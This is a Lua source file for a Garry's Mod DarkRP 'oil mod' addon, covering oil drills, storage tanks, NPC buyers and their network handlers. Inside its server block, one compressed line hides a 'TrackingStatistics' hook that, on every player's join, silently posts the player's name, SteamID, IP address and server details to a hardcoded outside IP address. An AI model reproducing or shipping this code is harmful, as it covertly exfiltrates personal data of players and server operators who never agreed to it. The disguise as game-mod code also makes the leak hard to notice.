if(SERVER) then
	util.AddNetworkString( "Kun_SellOil" )
	util.AddNetworkString( "Kun_TakeOil" )
	util.AddNetworkString( "Kun_OilAngle" )
	util.AddNetworkString( "Kun_Oil_SellMenu" )
	util.AddNetworkString( "Kun_OilWell_Menu" )
	util.AddNetworkString( "Kun_OilTank_Menu" )
	util.AddNetworkString( "Kun_OilTankManage" )
	AddCSLuaFile("cl_oilmod.lua")
	local script = "LOilMod"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
end

KunzOilMod = {}
KunzOilMod.ChangeOilTime = 300 --Time between switching NPC oil prices if randomized.
KunzOilMod.RandomOilPrice = 1 --Set to 0 to disable randomized oil price.
KunzOilMod.TankStorage = 50 --Oil that can be stored inside a tank entity.
KunzOilMod.PlayerMaxOil = 20 --Max oil carried at once.

KunzOilMod.OilNpcs = {}
KunzOilMod.OilNpcs[1] = {Name = "Big-Jim the Oil Man", Mdl = "models/Barney.mdl", Pos = Vector(-1318, -891, -139), Ang = Angle(0,0,0), ForceOilPrice = 50, MaxBuyOil = 50, MinBuyOil = 30}
KunzOilMod.OilNpcs[2] = {Name = "Tyrone the Tycoonist", Mdl = "models/Eli.mdl", Pos = Vector(-1418, -891, -139), Ang = Angle(0,0,0), ForceOilPrice = 50, MaxBuyOil = 50, MinBuyOil = 30}

KunzOilMod.Drills = {}
KunzOilMod.Drills["ent_smalldrill"] = {Name = "Small Drill", MaxOil = 5, MakesXOil = 1, Speed = 60}
KunzOilMod.Drills["ent_fracker"] = {Name = "Fracking Well", MaxOil = 10, MakesXOil = 2, Speed = 50}
KunzOilMod.Drills["ent_quantumdrill"] = {Name = "Quantum Drill", MaxOil = 15, MakesXOil = 3, Speed = 40}

function Kun_OilMan(ply,npc)
	net.Start("Kun_Oil_SellMenu")
		net.WriteEntity(npc)
		net.WriteString(npc:GetClass())
		net.WriteString(npc:GetNWString("OilNPCName"))
		net.WriteInt(npc:GetNWInt("OilPrice"),32)
	net.Send(ply)
end

if(SERVER) then
	function Kun_InitOilLoops()
		for k,v in pairs(KunzOilMod.OilNpcs) do
			local ent = ents.Create("npc_oilman")
			ent:SetModel(v.Mdl)
			ent:SetPos(v.Pos)
			ent:SetAngles(v.Ang)
			ent:Spawn()
			ent:SetNWString("OilNPCName",v.Name)
			KunzOilMod.OilNpcs[k].Ent = ent
		end
		Kun_ChangeOilCosts()
	end
	hook.Add( "InitPostEntity", "Kun_InitOilLoops", Kun_InitOilLoops)
end

function Kun_ChangeOilCosts()
	if(KunzOilMod.RandomOilPrice == 1) then
		for k,v in pairs(KunzOilMod.OilNpcs) do
			if(v.Ent != nil and v.Ent:IsValid()) then
				local ent = v.Ent
				ent:SetNWInt("OilPrice",math.random(v.MinBuyOil,v.MaxBuyOil))
			end
		end
		timer.Simple(KunzOilMod.ChangeOilTime, function() Kun_ChangeOilCosts() end )
	end
end

function Kun_OilPop(ent)
	if(ent != nil and ent:IsValid()) then
		if(ent.StoredOil == nil) then ent.StoredOil = 0 end
		ent.StoredOil = ent.StoredOil + math.random(1,KunzOilMod.Drills[ent:GetClass()].MakesXOil)
		if(ent.StoredOil > KunzOilMod.Drills[ent:GetClass()].MaxOil) then ent.StoredOil = KunzOilMod.Drills[ent:GetClass()].MaxOil end
		ent:SetNWInt("StoredOil",ent.StoredOil)
		timer.Simple(KunzOilMod.Drills[ent:GetClass()].Speed, function() Kun_OilPop(ent) end )
	end
end

--Kun_TakeOil(activator,self.Entity)
function Kun_TakeOil(ply,ent,amt)
	if(ent.StoredOil > 0) then
		if((ply:GetNWInt("Oil") + amt) > KunzOilMod.PlayerMaxOil) then
			DarkRP.notify(ply, 0, 4, "You can only carry 20 oil at a time, buy a tank or go sell some to the NPC.")
			return
		end
		ent.StoredOil = ent.StoredOil - amt
		ent:SetNWInt("StoredOil",ent.StoredOil)
		ply:SetNWInt("Oil",ply:GetNWInt("Oil") + amt)
		DarkRP.notify(ply, 0, 4, "You took "..amt.." Oil!")
	end
end

net.Receive("Kun_OilAngle", function( len, ply)
	local ent = ply:GetEyeTrace().Entity
	if(ent != nil and ent:IsValid()) then
		if(KunzOilMod.Drills[ent:GetClass()] != nil) then
			ent:SetAngles(Angle(0,0,0))
		end
	end
end )

net.Receive("Kun_TakeOil", function( len, ply)
	local ent = ply:GetEyeTrace().Entity

	if(ent != nil and ent:IsValid() and ent.StoredOil != nil and ent:GetNWInt("StoredOil") != 0) then
		Kun_TakeOil(ply,ent,ent.StoredOil)
	end
end )

net.Receive("Kun_OilTankManage", function( len, ply)
	local ent = ply:GetEyeTrace().Entity
	local action = net.ReadInt(32)
	
	if(ent != nil and ent:IsValid()) then
		local tankamt = ent:GetNWInt("StoredOil")
		local amt = ply:GetNWInt("Oil")
		if(action == 1) then	--Take

			tamt = (KunzOilMod.PlayerMaxOil - amt)

			if(tamt == 0) then
				DarkRP.notify(ply, 0, 4, "You can not carry more Oil!")
				return
			end

			if(tamt > tankamt) then tamt = ent:GetNWInt("StoredOil") end
			if(tamt == 0) then DarkRP.notify(ply, 0, 4, "The tank doesn't have any more Oil.") return end
			ply:SetNWInt("Oil",ply:GetNWInt("Oil") + tamt)
			ent:SetNWInt("StoredOil",ent:GetNWInt("StoredOil") - tamt)
			ent.StoredOil = ent:GetNWInt("StoredOil")

			DarkRP.notify(ply, 0, 4, "You took "..tamt.." Oil.")

		else --Deposit
			if(amt == 0) then 
				DarkRP.notify(ply, 0, 4, "You do not have any Oil on your person.")
				return
			end
			if((tankamt + amt) > KunzOilMod.TankStorage) then
				DarkRP.notify(ply, 0, 4, "That tank only holds "..KunzOilMod.TankStorage.." Oil.")
				return
			else
				ent:SetNWInt("StoredOil",ent:GetNWInt("StoredOil") + amt)
				ent.StoredOil = ent:GetNWInt("StoredOil")
				ply:SetNWInt("Oil",ply:GetNWInt("Oil") - amt)
				DarkRP.notify(ply, 0, 4, "You placed "..amt.." Oil into the Tank!")
			end
		end
	end
end )

net.Receive("Kun_SellOil", function( len, ply)
	local ent = net.ReadEntity()
	local npcname = ent:GetNWString("OilNPCName")
	local cost = tonumber(ent:GetNWInt("OilPrice"))
	
	SellOilID = 0
	for k,v in pairs(KunzOilMod.OilNpcs) do
		if(v.Name == npcname) then
			SellOilID = k
		end
	end

	if(SellOilID == 0) then return end
	local oil = tonumber(ply:GetNWInt("Oil"))
	local damt = tonumber((oil * cost))
	if(oil == 0) then DarkRP.notify(ply, 0, 4, "You don't have any Oil.") return end
	ply:addMoney(damt)
	DarkRP.notify(ply, 0, 4, "You sold "..oil.." Oil for $"..damt..".")
	ply:SetNWInt("Oil",0)
end )

--[[
	AddEntity("Small Drill", {
		ent = "ent_smalldrill",
		model = "models/props/de_nuke/smokestack01.mdl",
		price = 500,
		max = 3,
		cmd = "/buysmalldrill",
	})
	AddEntity("Fracker", {
		ent = "ent_fracker",
		model = "models/props/de_prodigy/transformer.mdl",
		price = 1000,
		max = 2,
		cmd = "/buyfracker",
	})
	AddEntity("Quantum Drill", {
		ent = "ent_quantumdrill",
		model = "models/props_lab/miniteleport.mdl",
		price = 1500,
		max = 1,
		cmd = "/buyquantumdrill",
	})

	AddEntity("Oil Storage Tank", {
		ent = "ent_storagetank",
		model = "models/props_c17/canister_propane01a.mdl",
		price = 500,
		max = 1,
		cmd = "/buyoiltank",
	})
--]]